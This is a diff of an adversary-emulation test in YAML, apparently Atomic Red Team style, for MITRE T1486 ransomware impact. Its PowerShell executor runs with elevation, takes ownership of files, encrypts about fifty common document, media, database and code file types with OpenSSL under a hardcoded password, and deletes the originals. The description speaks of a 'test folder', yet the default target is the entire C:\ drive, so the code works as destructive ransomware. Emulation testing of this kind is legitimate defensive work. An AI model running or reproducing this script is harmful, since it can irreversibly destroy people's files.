@@ -1,189 +1,142 @@
 attack_technique: T1486
- display_name: Data Encrypted for Impact (Destructive Version)
- atomic_tests:
-   - name: Encrypt and delete files recursively in a test folder
-     auto_generated_guid: custom-guid-1234567890abcdef
-     description: |
-       This test encrypts all files in a test folder using a strong password and then deletes the original files.
-     description: >
-       This test encrypts all files in a test folder using a strong
-       password and then deletes the original files.
- 
-       WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
-     supported_platforms:
-       - windows
- @@ -16,94 +19,108 @@ atomic_tests:
-       target_directory:
-         description: Directory to encrypt and delete files from
-         type: path
-         default: "C:\\"
-         default: C:\
-       target_extensions:
-         description: List of file extensions to target for encryption
-         type: array
-         default:
-           - ".doc"
-           - ".docx"
-           - ".xls"
-           - ".xlsx"
-           - ".ppt"
-           - ".pptx"
-           - ".pdf"
-           - ".txt"
-           - ".rtf"
-           - ".jpg"
-           - ".jpeg"
-           - ".png"
-           - ".bmp"
-           - ".gif"
-           - ".tiff"
-           - ".svg"
-           - ".mp3"
-           - ".wav"
-           - ".aac"
-           - ".flac"
-           - ".m4a"
-           - ".mp4"
-           - ".avi"
-           - ".mkv"
-           - ".mov"
-           - ".wmv"
-           - ".zip"
-           - ".rar"
-           - ".7z"
-           - ".tar"
-           - ".gz"
-           - ".mdb"
-           - ".accdb"
-           - ".sql"
-           - ".db"
-           - ".sqlite"
-           - ".psd"
-           - ".ai"
-           - ".cpp"
-           - ".java"
-           - ".py"
-           - ".js"
-           - ".html"
-           - ".json"
-           - ".xml"
-           - ".yml"
-           - ".bak"
-           - ".log"
-           - .doc
-           - .docx
-           - .xls
-           - .xlsx
-           - .ppt
-           - .pptx
-           - .pdf
-           - .txt
-           - .rtf
-           - .jpg
-           - .jpeg
-           - .png
-           - .bmp
-           - .gif
-           - .tiff
-           - .svg
-           - .mp3
-           - .wav
-           - .aac
-           - .flac
-           - .m4a
-           - .mp4
-           - .avi
-           - .mkv
-           - .mov
-           - .wmv
-           - .zip
-           - .rar
-           - .7z
-           - .tar
-           - .gz
-           - .mdb
-           - .accdb
-           - .sql
-           - .db
-           - .sqlite
-           - .psd
-           - .ai
-           - .cpp
-           - .java
-           - .py
-           - .js
-           - .html
-           - .json
-           - .xml
-           - .yml
-           - .bak
-           - .log
-     dependency_executor_name: powershell
-     dependencies:
-       - description: |
-           Checks if openssl is installed
-         prereq_command: |
-           if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
-         get_prereq_command: |
-         prereq_command: >
-           if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0
-           } else { exit 1 }
-         get_prereq_command: >
-           Write-Host "Installing OpenSSL..."
- 
-           Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\\openssl-installer.exe"
- 
-           Start-Process "$env:TEMP\\openssl-installer.exe" -ArgumentList "/S" -Wait
- 
-           # Validate installation
- 
-           if (-Not (Get-Command openssl -ErrorAction SilentlyContinue)) {
-               Write-Host "OpenSSL installation failed."
-               exit 1
-           }
-     executor:
-       name: powershell
-       elevation_required: true
-       command: |
-       command: >
-         $password = "#{encryption_password}"
- 
-         $targetDir = "#{target_directory}"
- 
-         $targetExtensions = "#{target_extensions}".Split(",")
- 
- 
-         # Convert extensions to a format suitable for PowerShell filtering
- 
-         $includeClause = $targetExtensions | ForEach-Object { "*$_" } -join ","
- 
- 
-         # Validate target directory
- 
-         if (-Not (Test-Path $targetDir)) {
-             Write-Host "❌ The target directory $targetDir does not exist."
-             exit 1
-         }
- 
- 
-         Write-Host "✅ Starting encryption process..."
- 
- 
-         # Encrypt files recursively
- 
-         Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
-             $file = $_.FullName
- 
- @@ -136,7 +153,10 @@ atomic_tests:
-             }
-         }
- 
- 
-         Write-Host "✅ Encryption and deletion process completed!"
-       cleanup_command: |
-         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
-       cleanup_command: >
-         Write-Host "No cleanup performed for destructive actions. To
-         recover encrypted files, use the decryption password provided."
- 
-         # Note: Ensure that the decryption password is securely stored and accessible.
+display_name: Data Encrypted for Impact (Destructive Version)
+atomic_tests:
+  - name: Encrypt and delete files recursively in a test folder
+    auto_generated_guid: custom-guid-1234567890abcdef
+    description: |
+      This test encrypts all files in a test folder using a strong password and then deletes the original files.
+      WARNING: THIS IS A DESTRUCTIVE ACTION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
+    supported_platforms:
+      - windows
+    input_arguments:
+      encryption_password:
+        description: Password to use for encryption
+        type: string
+        default: ChaymaOumayma2025
+      target_directory:
+        description: Directory to encrypt and delete files from
+        type: path
+        default: "C:\\"
+      target_extensions:
+        description: List of file extensions to target for encryption
+        type: array
+        default:
+          - ".doc"
+          - ".docx"
+          - ".xls"
+          - ".xlsx"
+          - ".ppt"
+          - ".pptx"
+          - ".pdf"
+          - ".txt"
+          - ".rtf"
+          - ".jpg"
+          - ".jpeg"
+          - ".png"
+          - ".bmp"
+          - ".gif"
+          - ".tiff"
+          - ".svg"
+          - ".mp3"
+          - ".wav"
+          - ".aac"
+          - ".flac"
+          - ".m4a"
+          - ".mp4"
+          - ".avi"
+          - ".mkv"
+          - ".mov"
+          - ".wmv"
+          - ".zip"
+          - ".rar"
+          - ".7z"
+          - ".tar"
+          - ".gz"
+          - ".mdb"
+          - ".accdb"
+          - ".sql"
+          - ".db"
+          - ".sqlite"
+          - ".psd"
+          - ".ai"
+          - ".cpp"
+          - ".java"
+          - ".py"
+          - ".js"
+          - ".html"
+          - ".json"
+          - ".xml"
+          - ".yml"
+          - ".bak"
+          - ".log"
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Checks if openssl is installed
+        prereq_command: |
+          if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          Write-Host "Installing OpenSSL..."
+          Invoke-WebRequest "https://slproweb.com/download/Win64OpenSSL_Light-3_2_1.exe" -OutFile "$env:TEMP\\openssl-installer.exe"
+          Start-Process "$env:TEMP\\openssl-installer.exe" -ArgumentList "/S" -Wait
+          # Validate installation
+          if (-Not (Get-Command openssl -ErrorAction SilentlyContinue)) {
+              Write-Host "OpenSSL installation failed."
+              exit 1
+          }
+    executor:
+      name: powershell
+      elevation_required: true
+      command: |
+        $password = "#{encryption_password}"
+        $targetDir = "#{target_directory}"
+        $targetExtensions = "#{target_extensions}".Split(",")
+
+        # Convert extensions to a format suitable for PowerShell filtering
+        $includeClause = $targetExtensions | ForEach-Object { "*$_" } -join ","
+
+        # Validate target directory
+        if (-Not (Test-Path $targetDir)) {
+            Write-Host "❌ The target directory $targetDir does not exist."
+            exit 1
+        }
+
+        Write-Host "✅ Starting encryption process..."
+
+        # Encrypt files recursively
+        Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
+            $file = $_.FullName
+
+            # Log the current file being processed
+            Write-Host "🔍 Processing file: $file"
+
+            # Take ownership and modify permissions
+            try {
+                takeown /F $file /A
+                icacls $file /grant Administrators:F /T /C
+                Write-Host "🔑 Permissions modified successfully for: $file"
+            } catch {
+                Write-Host "❌ Failed to modify permissions for file: $file"
+                return
+            }
+
+            # Encrypt the file with OpenSSL
+            $encryptedFile = "$file.enc"
+            Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
+            openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
+            
+            if ($LASTEXITCODE -eq 0) {
+                Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
+                
+                # Delete the original file after successful encryption
+                Remove-Item -Path $file -Force
+                Write-Host "🗑️ Deleted original file: $file"
+            } else {
+                Write-Host "❌ Failed to encrypt: $file"
+            }
+        }
+
+        Write-Host "✅ Encryption and deletion process completed!"
+      cleanup_command: |
+        Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
+        # Note: Ensure that the decryption password is securely stored and accessible.
